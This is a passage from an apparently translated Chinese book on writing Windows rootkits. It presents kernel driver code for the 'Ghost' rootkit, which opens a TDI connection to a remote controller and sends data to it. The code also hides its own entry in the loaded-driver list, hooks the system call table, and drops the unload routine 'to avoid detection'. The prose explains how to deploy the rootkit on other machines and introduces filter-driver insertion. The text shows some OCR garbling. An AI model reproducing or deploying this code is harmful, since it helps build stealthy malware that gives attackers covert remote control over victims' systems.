controllerTaIpAddress.Address[0].AddressLength = TDI_ADDRESS_LENGTH_IP;
controllerTaIpAddress.Address[0].AddressType = TDI_ADDRESS_TYPE_IP;
controllerTaIpAddress.Address[0].Address[0].sin_port = controllerPort;
controllerTaIpAddress.Address[0].Address[0].in_addr = controllerIpAddress;
controllerConnection.UserDataLength = 0;
controllerConnection.UserData = 0;
controllerConnection.OptionsLength = 0;
controllerConnection.Options = 0;
controllerConnection.RemoteAddressLength = sizeof(controllerTaIpAddress);
controllerConnection.RemoteAddress = &controllerTaIpAddress;
// add controller data to the packet
TdiBuildConnect( pIrp,
pDeviceObject,
pFileObject,
NULL,
NULL,
NULL,
&controllerConnection,
0 );
// set completion routine
IoSetCompletionRoutine( pIrp, TDICompletionRoutine, &connectionEvent, TRUE, TRUE,
TRUE);
// Send the packet
status = IoCallDriver( pDeviceObject, pIrp );
// wait
if( status == STATUS_PENDING )
{
DbgPrint("comint32: OpenTDIConnection() waiting on IRP (connect)...");
KeWaitForSingleObject(&connectionEvent, Executive, KernelMode, FALSE, 0);
}
if( ( status != STATUS_SUCCESS ) &&
( status != STATUS_PENDING ) )
{
DbgPrint("comint32: OpenTDIConnection() Connection failed. Status = %0x",
status);
return( STATUS_UNSUCCESSFUL );
}
// Start a Deferred Procedure Call
// Objects must be non paged
pKernelTimer = ExAllocatePool( NonPagedPool, sizeof( KTIMER ) );
pKernelDPC = ExAllocatePool( NonPagedPool, sizeof( KDPC ) );
timeout.QuadPart = -10;
KeInitializeTimer( pKernelTimer );
KeInitializeDpc( pKernelDPC, timerDPC, NULL );
if( KeSetTimerEx( pKernelTimer, timeout, 500, pKernelDPC ) ) // 1/2 second
{
DbgPrint("comint32: OpenTDIConnection() Timer was already set.");
}
return STATUS_SUCCESS;
}
// Clean up
void CloseTDIConnection()
{
KeCancelTimer( pKernelTimer );
ExFreePool( pKernelTimer );
ExFreePool( pKernelDPC );
if( pFileInfo != NULL )
ExFreePool( pFileInfo );
if( pKernelTimer == NULL )
ExFreePool( pKernelTimer );
if( pKernelDPC == NULL )
ExFreePool( pKernelDPC );
if( pSendBuffer != NULL )
ExFreePool( pSendBuffer );
if( pSendMdl != NULL )
IoFreeMdl( pSendMdl );
if( pReceiveMdl != NULL )
IoFreeMdl( pReceiveMdl );
}
NTSTATUS SendToRemoteController( char* buffer )
{
NTSTATUS
status;
ULONG
bufferLength;
KEVENT
SendEvent;
PIRP
pIrp;
IO_STATUS_BLOCKIoStatusBlock;
KeInitializeEvent( &SendEvent, NotificationEvent, FALSE );
bufferLength = strlen( buffer );
if( pSendBuffer != NULL )
ExFreePool( pSendBuffer );
pSendBuffer = ExAllocatePool( NonPagedPool, bufferLength );
memcpy( pSendBuffer, buffer, bufferLength );
// build an IO Request Packet
pIrp = TdiBuildInternalDeviceControlIrp( TDI_SEND,
pDeviceObject,
pFileObject,
&SendEvent,
&IoStatusBlock );
if( pIrp == NULL )
{
DbgPrint( "comint32: SendToRemoteController() could not get an IRP for TDI_SEND"
);
return( STATUS_INSUFFICIENT_RESOURCES );
}
if( pSendMdl != NULL )
IoFreeMdl( pSendMdl );
pSendMdl = IoAllocateMdl( pSendBuffer, bufferLength, FALSE, FALSE, pIrp );
if( pSendMdl == NULL )
{
DbgPrint("comint32: SendToRemoteController() could not get an MDL for TDI_SEND");
return( STATUS_INSUFFICIENT_RESOURCES );
}
__try
{
MmProbeAndLockPages(
pSendMdl,
KernelMode,
IoModifyAccess );
}
__except( EXCEPTION_EXECUTE_HANDLER )
{
DbgPrint("comint32: SendToRemoteController() ProbeAndLock exception.");
return( STATUS_UNSUCCESSFUL );
}
// Extend the packet
TdiBuildSend( pIrp,
pDeviceObject,
pFileObject,
NULL,
NULL,
pSendMdl,
0,
bufferLength );
// set completion routine
IoSetCompletionRoutine( pIrp, TDICompletionRoutine, &SendEvent, TRUE, TRUE, TRUE);
// Send the packet
status = IoCallDriver( pDeviceObject, pIrp );
// wait
if( status == STATUS_PENDING )
{
DbgPrint("comint32: SendToRemoteController() waiting on IRP (send)...");
KeWaitForSingleObject( &SendEvent, Executive, KernelMode, FALSE, 0 );
}
if( ( status != STATUS_SUCCESS ) &&
( status != STATUS_PENDING ) )
{
DbgPrint("comint32: SendToRemoteController() Send failed. Status = %0x", status);
return( STATUS_UNSUCCESSFUL );
}
return STATUS_SUCCESS;
}
// called periodically
VOID timerDPC( PKDPC Dpc, PVOID DeferredContext, PVOID sys1, PVOID sys2 )
{
// poll for commands
}
SOURCES
SOURCES
SOURCES
SOURCES
和增加所有新文件到我们的 rootkit 中一样，将 commManager.c 增加到 SOURCES 中：
TARGETNAME=comint32
TARGETPATH=OBJ
TARGETTYPE=DRIVER
SOURCES=Ghost.c\
fileManager.c\
IoManager.c\
commManager.c\
hookManager.c\
configManager.c
最后，需要向 Ghost.c 文件中增加如下代码：
#include commManager.hVOID OnUnload( IN PDRIVER_OBJECT pDriverObject )
{
UNICODE_STRING deviceLink = { 0 };
// Close the connection to remote controller
CloseTDIConnection();
// remove device controller
RtlInitUnicodeString( &deviceLink, GHOST_DEVICE_LINK_NAME );
IoDeleteSymbolicLink( &deviceLink );
IoDeleteDevice( pDriverObject->DeviceObject );
DbgPrint("comint32: Device controller removed.");
// Unhook any hooked functions and return the Memory Descriptor List
f( NewSystemCallTable )
{
UNHOOK( ZwMapViewOfSection, OldZwMapViewOfSection );
MmUnmapLockedPages( NewSystemCallTable, pMyMDL );
IoFreeMdl( pMyMDL );
}
DbgPrint("comint32: Hooks removed.");
}
只需要在 OnLoad 中增加 CloseTDIConnection 调用：
NTSTATUS DriverEntry( IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING
theRegistryPath )
{
DRIVER_DATA* driverData;
UNICODE_STRING deviceName = { 0 };
UNICODE_STRING deviceLink = { 0 };
PDEVICE_OBJECT pDeviceController;
// Get the operating system version
PsGetVersion( &majorVersion, &minorVersion, NULL, NULL );
// Major = 4: Windows NT 4.0, Windows Me, Windows 98 or Windows 95
// Major = 5: Windows Server 2003, Windows XP or Windows 2000
// Minor = 0: Windows 2000, Windows NT 4.0 or Windows 95
// Minor = 1: Windows XP
// Minor = 2: Windows Server 2003
if ( majorVersion == 5 && minorVersion == 2 )
{
DbgPrint("comint32: Running on Windows 2003");
}
else if ( majorVersion == 5 && minorVersion == 1 )
{
DbgPrint("comint32: Running on Windows XP");
}
else if ( majorVersion == 5 && minorVersion == 0 )
{
DbgPrint("comint32: Running on Windows 2000");
}
else if ( majorVersion == 4 && minorVersion == 0 )
{
DbgPrint("comint32: Running on Windows NT 4.0");
}
else
{
DbgPrint("comint32: Running on unknown system");
}
// Hide this driver
driverData = *((DRIVER_DATA**)((DWORD)pDriverObject + 20));
if( driverData != NULL )
{
// unlink this driver entry from the driver list
*((PDWORD)driverData->listEntry.Blink) = (DWORD)driverData->listEntry.Flink;
driverData->listEntry.Flink->Blink = driverData->listEntry.Blink;
}
// Get the remote controller's address and port
if( !NT_SUCCESS( Configure() ) )
{
DbgPrint("comint32: Configure failed!\n");
return STATUS_UNSUCCESSFUL;
}
// Add kernel hooks
if( !NT_SUCCESS( HookKernel() ) )
{
DbgPrint("comint32: HookKernel failed!\n");
return STATUS_UNSUCCESSFUL;
}
// Open the connection to remote controller
if( !NT_SUCCESS( OpenTDIConnection() ) )
{
DbgPrint("comint32: Could not open remote connection.\n");
return STATUS_UNSUCCESSFUL;
}
// Tell remote controller that we're here
SendToRemoteController( "207.46.20.30" );
// Create the device controller
RtlInitUnicodeString( &deviceName, GHOST_DEVICE_CREATE_NAME );
IoCreateDevice( pDriverObject,
0,
&deviceName,
FILE_DEVICE_UNKNOWN,
0,
FALSE,
&pDeviceController );
RtlInitUnicodeString( &deviceLink, GHOST_DEVICE_LINK_NAME );
IoCreateSymbolicLink( &deviceLink, &deviceName );
pDriverObject->MajorFunction[IRP_MJ_CREATE] =
pDriverObject->MajorFunction[IRP_MJ_CLOSE]
=
pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL]
= OnDispatch;
// Comment out in free build to avoid detection
pDriverObject->DriverUnload = OnUnload;
return STATUS_SUCCESS;
}
OpenTDIConnection 和 SendToRemoteController 已 经 被 增 加 到 了 DriverEntry 中 。
OpenTDIConnection 在确保所有可能返回条件中 TDI 连接被创建后 DriverEntry 不会返回失
败结果后才被增加。如果增加了其他可能的错误条件，必须在返回结果前小心的关闭 TDI
连接。SendToRemoteController 向远程控制端发送一个网络地址。在正常情况下，这个地址
是启动连接的机器的地址。
运行实例
我们现在来演示 TDI 连接，首先运行 GhostTracker (GT.exe)。GhostTracker 提供了一个
简单由连接客户端 IP 地址构成的列表控制界面。因为 c:\config32 被设置为运行 GhostTracker
机 器 的 IP 地 址 ， Ghost 就 会 打 开 一 个 TDI 连 接 来 指 向 GhostTracker 并 通 过
SendToRemoteController 向控制端发送一个连接字符串。为了启动这个连接你只需使用本书
中一直使用的“SCMLoader”和“net start MyDeviceDriver”命令来运行 Ghost。如图 6-2 所示，
一个典型的 rootkit 环境。
如果你有两台或更多的电脑，你可以在一台上运行 GhostTracker 在其他机器上运行 Ghost。
只要确保将运行 GhostTracker 的电脑的 IP 地址添加到其他机器的 config32 文件中。这将让
你感受到 rootkits 在实际攻击中是如何工作的。GhostTracker 如图 6-3 所示。
当 GhostTracker 中的列表框开始出现客户端连接时，你可以在任何一个 IP 地址上双击
来打开相应客户的远程控制界面。然而，不要对这个例子期望太多。毕竟 GhostTracker 只是
一个简单的没有操作能力的模型而已。GhostTracker 控制界面如图 6-4 所示。
总结
我们现在拥有了具有如下功能的 rootkit：
隐藏设备驱动条目
隐藏配置文件
挂钩操作系统内核
挂钩所选操作系统加载的进程
处理来自用户模式程序的指令
与远程控制端通讯
虽然这章只是详述了初级的远程控制连接，作为一个热身还是足够的。现在我们已经可
以启动一个连接，一个循环查询子程序检测远程命令；一个命令解析子程序可以执行远程控
制端的一些渴望的功能。下章介绍过滤驱动程序。
笫 7777 章 过滤驱动
概述
这章主要讲述文件过滤驱动和网络过滤驱动。过滤驱动主要用于在上层的软件和下层的硬件
之间进行分层通信。通过栈、分层和过滤可以把硬件和软件通过任意数量的层连接起来，这
种分层方法使得我们可以在一个现有的栈中插入自己的过滤器。在一个栈中插入我们自己的
层是非常难被检测到的，但是却能对所有通过栈的通信进行完全的控制。当这个栈是控制着
一张网卡或者一个磁盘的时候这就变得非常有用了。
本章包括下面的内容。
。过滤驱动的插入
。文件系统过滤驱动
。网络过滤驱动
。过滤技术的一个综合实例
过滤驱动的插入
在一个驱动栈中插入一个驱动能够让我们的 rootkit 对操作系统进行一些特殊的控制，这种
技术被广泛地应用于杀毒软件、加密软件、和压缩软件中。事实上，它还有很多用途，驱动
加载器为了能以正确地顺序加载所有有滤过驱动必须去组织好它们。
注册表中 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services 这个项指明了要
加载的服务和驱动。如果你在注册表中查看这个项你会发现里面有好几百个服务和驱动条
目 ， 当 使 用 本 书 提 供 的 SCMLoader 来 加 载 一 个 驱 动 时 也 会 在 这 里 生 成 一 个 以
MyDeviceDriver 开 头 的 项 。 到 目 前 为 止 ， SCMLoader
要 加 载 一 个
on-demand
(SERVICE_DEMAND_START) 类型的设备驱动需要执行 "net start MyDeviceDriver" 命令
才 能 成 功 加 载 。 为 了 进 行 文 件 系 统 过 滤 ， rootkit 必 须 作 为 一 个
automatic
(SERVICE_AUTO_START) 类型的设备驱动被加载在 "Filter" 组里。
因为 on-demand loading 比 Autoloading 更具有指导意义，所以在讲解时继续使用 SERVICE_
DEMAND_START 和“net start mydevicedriver”，但我们在本章的文件目录下提供了另一个新
的 SCMLoader(Wrox/Wiley )供大家下载，这个升级版的 loader 允许 rootkit 在启动的时候自
动加载，应该用于最终发行版 rootkkit 的插入。
当
驱
动
自
动
加
载
的
时
候
，
加
载
的
顺
序